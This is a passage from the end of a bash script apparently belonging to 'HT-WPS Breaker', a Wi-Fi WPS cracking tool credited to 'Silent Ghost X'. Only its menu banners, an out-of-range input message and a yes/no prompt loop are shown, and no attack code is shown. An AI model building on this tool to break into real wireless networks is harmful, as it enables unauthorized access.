                echo -e "$White[${Green} ok ${White}]$Green HT-WPS Breaker$White By$BYellow Silent Ghost X ."
                echo ""
                exit
            ;;
            *)
                echo ""
                echo -e "$White     [${Red}!${White}]$Red Input${White} out of range."
                echo ""
            ;;
        esac
        echo ""
        echo -e "$White     [${Green} ok ${White}]$Green HT-WPS Breaker$White By$BYellow Silent Ghost X ."
        echo -e "\e[0;39m"
        re=$(echo $re | tr [:upper:] [:lower:])
        while [ "$re" != 'y' ] && [ "$re" != 'yes' ] && [ "$re" != 'n' ] && [ "$re" != 'no' ] && [ "$re" != 'o' ] && [ "$re" != 'oui' ] && [ "$re" != "\n" ]
        do
            echo -n -e "$Red\r                 [+]$White Try again (${BGreen}Y${White})es or (${BGreen}N${White})o :$BGreen "
            read re
            re=$(echo $re | tr [:upper:] [:lower:])
            echo -en "\033[1A\033[2K"
            echo -e "$DefaultColor"
        done
        
    fi
    
done
